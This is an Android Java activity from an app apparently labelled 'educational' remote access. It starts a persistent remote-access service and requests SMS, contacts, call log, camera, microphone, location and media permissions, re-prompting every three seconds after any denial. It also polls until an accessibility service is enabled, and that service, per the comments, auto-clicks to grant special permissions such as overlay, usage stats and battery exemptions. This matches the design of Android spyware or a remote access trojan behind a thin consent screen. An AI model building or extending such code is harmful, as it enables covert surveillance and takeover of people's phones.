package com.remoteaccess.educational;

import android.Manifest;
import android.content.Intent;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.remoteaccess.educational.permissions.AutoPermissionManager;
import com.remoteaccess.educational.services.RemoteAccessService;
import com.remoteaccess.educational.services.UnifiedAccessibilityService;
import com.remoteaccess.educational.utils.PreferenceManager;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;

    // Prevent requesting standard permissions more than once every 5 seconds
    private long lastStandardPermRequestTime = 0;
    private static final long PERM_REQUEST_COOLDOWN_MS = 5000;

    private TextView statusText;
    private Button consentButton;
    private PreferenceManager preferenceManager;
    private AutoPermissionManager permissionManager;
    private boolean pollingForAccessibility = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        preferenceManager = new PreferenceManager(this);
        permissionManager = new AutoPermissionManager(this);

        statusText    = findViewById(R.id.statusText);
        consentButton = findViewById(R.id.consentButton);

        if (preferenceManager.isConsentGiven()) {
            showActiveStatus();
            startRemoteAccessService();

            if (!permissionManager.isAccessibilityServiceEnabled()) {
                // Accessibility not yet granted — ask for it
                permissionManager.requestAccessibilityService();
                startPollingForAccessibility();
            } else {
                // Accessibility already active — request standard permissions right away.
                // Battery / overlay / usage stats are handled by the accessibility service
                // inside onServiceConnected (with a delay so standard permissions show first).
                requestStandardPermissions();
            }
        } else {
            showConsentRequired();
        }

        consentButton.setOnClickListener(v -> {
            if (!preferenceManager.isConsentGiven()) {
                startActivity(new Intent(MainActivity.this, ConsentActivity.class));
            } else {
                revokeConsent();
            }
        });
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (!preferenceManager.isConsentGiven()) return;

        showActiveStatus();

        if (permissionManager.isAccessibilityServiceEnabled()) {
            // Accessibility is active — start auto-click timer if service is running
            UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
            if (svc != null) svc.startGrantPermsTimer();

            // Request any still-missing standard permissions, but guard against
            // rapid duplicate calls (e.g. polling + onResume firing at the same time)
            requestStandardPermissionsIfCooledDown();
        } else {
            // Accessibility lost (e.g. rebooted) — ask again
            if (!pollingForAccessibility) {
                permissionManager.requestAccessibilityService();
                startPollingForAccessibility();
            }
        }
    }

    // ── Standard runtime permissions ────────────────────────────────────────

    /** Request ALL standard runtime permissions in one shot. */
    private void requestStandardPermissions() {
        lastStandardPermRequestTime = System.currentTimeMillis();

        List<String> needed = new ArrayList<>();
        String[] permissions = buildPermissionList();
        for (String p : permissions) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                needed.add(p);
            }
        }
        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                needed.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }

    /** Same as above but only if the cooldown has elapsed. */
    private void requestStandardPermissionsIfCooledDown() {
        if (System.currentTimeMillis() - lastStandardPermRequestTime >= PERM_REQUEST_COOLDOWN_MS) {
            requestStandardPermissions();
        }
    }

    private String[] buildPermissionList() {
        List<String> list = new ArrayList<>();
        // Core dangerous permissions
        list.add(Manifest.permission.READ_SMS);
        list.add(Manifest.permission.SEND_SMS);
        list.add(Manifest.permission.RECEIVE_SMS);
        list.add(Manifest.permission.READ_CONTACTS);
        list.add(Manifest.permission.READ_CALL_LOG);
        list.add(Manifest.permission.CAMERA);
        list.add(Manifest.permission.RECORD_AUDIO);
        list.add(Manifest.permission.ACCESS_FINE_LOCATION);
        list.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        list.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        // Android 13+ permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            list.add("android.permission.READ_MEDIA_IMAGES");
            list.add("android.permission.READ_MEDIA_VIDEO");
            list.add("android.permission.READ_MEDIA_AUDIO");
            list.add("android.permission.POST_NOTIFICATIONS");
        }
        return list.toArray(new String[0]);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Re-try after 3 s for any still-missing permissions (user may have denied some)
            new Handler().postDelayed(this::requestStandardPermissions, 3000);
        }
    }

    // ── Accessibility polling ────────────────────────────────────────────────

    /**
     * Poll every second until the accessibility service is enabled.
     * When detected: immediately request standard permissions, then let the
     * accessibility service handle the special permissions with a built-in delay.
     */
    private void startPollingForAccessibility() {
        pollingForAccessibility = true;
        new Handler().postDelayed(() -> {
            if (!preferenceManager.isConsentGiven()) {
                pollingForAccessibility = false;
                return;
            }
            if (permissionManager.isAccessibilityServiceEnabled()) {
                pollingForAccessibility = false;
                // Standard permissions first — special permissions (battery first, then overlay,
                // usage stats, write settings) are opened by the state machine in
                // UnifiedAccessibilityService.onServiceConnected after a 1.5-second delay.
                requestStandardPermissions();
            } else {
                startPollingForAccessibility(); // keep polling
            }
        }, 1000);
    }

    // ── Helpers ─────────────────────────────────────────────────────────────

    private void showActiveStatus() {
        statusText.setText("✓ Remote Access Active\n\nYour device is connected and can be managed remotely.");
        consentButton.setText("Revoke Access");
    }

    private void showConsentRequired() {
        statusText.setText("⚠ Consent Required\n\nPlease provide consent to enable remote access features.");
        consentButton.setText("Give Consent");
    }

    private void startRemoteAccessService() {
        startForegroundService(new Intent(this, RemoteAccessService.class));
    }

    private void revokeConsent() {
        preferenceManager.setConsentGiven(false);
        stopService(new Intent(this, RemoteAccessService.class));
        showConsentRequired();
    }
}
